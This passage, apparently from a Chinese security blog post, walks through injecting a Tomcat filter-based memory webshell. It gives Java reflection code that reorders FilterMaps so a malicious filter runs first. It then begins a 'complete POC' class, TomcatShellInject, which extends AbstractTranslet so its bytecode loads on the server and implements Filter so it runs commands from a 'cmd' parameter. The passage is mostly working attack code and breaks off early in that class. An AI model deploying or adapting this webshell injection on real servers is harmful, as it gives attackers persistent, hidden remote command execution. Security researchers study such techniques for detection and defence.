</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * 将我们的 filtermap 插入到最前面
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
</span></span><span style="display:flex;"><span>Class ccc = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>    ccc = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#fff;font-weight:bold">catch</span> (Throwable t){}
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (ccc == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>        ccc = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.deploy.FilterMap&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#fff;font-weight:bold">catch</span> (Throwable t){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//把filter插到第一位
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> m = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.StandardContext&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;findFilterMaps&#34;</span>);
</span></span><span style="display:flex;"><span>Object[] filterMaps = (Object[]) m.<span style="color:#007f7f">invoke</span>(standardContext);
</span></span><span style="display:flex;"><span>Object[] tmpFilterMaps = <span style="color:#fff;font-weight:bold">new</span> Object[filterMaps.<span style="color:#007f7f">length</span>];
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> index = 1;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = 0; i &lt; filterMaps.<span style="color:#007f7f">length</span>; i++) {
</span></span><span style="display:flex;"><span>    Object o = filterMaps[i];
</span></span><span style="display:flex;"><span>    m = ccc.<span style="color:#007f7f">getMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;getFilterName&#34;</span>);
</span></span><span style="display:flex;"><span>    String name = (String) m.<span style="color:#007f7f">invoke</span>(o);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (name.<span style="color:#007f7f">equalsIgnoreCase</span>(FILTER_NAME)) {
</span></span><span style="display:flex;"><span>        tmpFilterMaps[0] = o;
</span></span><span style="display:flex;"><span>    } <span style="color:#fff;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        tmpFilterMaps[index++] = filterMaps[i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = 0; i &lt; filterMaps.<span style="color:#007f7f">length</span>; i++) {
</span></span><span style="display:flex;"><span>    filterMaps[i] = tmpFilterMaps[i];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>其实这步骤也是可以不要的,因为我们在<code>addMappingForUrlPatterns(EnumSet&lt;DispatcherType&gt; dispatcherTypes, boolean isMatchAfter, String... urlPatterns)</code>方法里面，我们只要传入的<code>isMatchAfter</code>为<code>false</code>，那么我们实际上就可以直接调用<code>addFilterMapBefore</code>方法，将filterMap放到filterMaps的最前面。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417152411831.png" alt="image-20230417152411831"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// 设置基本的url pattern, 并且注册filterMap，设置isMatchAfter为false,执行addFilterMapBefore方法，使filterMap插入的时候在最前面。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后步骤二的完整POC代码如下：</p>
<p>继承了<code>AbstractTranslet</code>类(携带恶意字节码到服务端加载执行)，同时实现了<code>Filter</code>接口，作为自定义的Filter，在它的<code>doFilter</code>方法中，对传入的命令参数执行命令。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.catalina.core.ApplicationContext;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.catalina.core.StandardContext;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.*;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName TomcatShellInject
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 22:07
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> TomcatShellInject <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet <span style="color:#fff;font-weight:bold">implements</span> Filter {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * webshell命令参数名
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> String cmdParamName = <span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>;
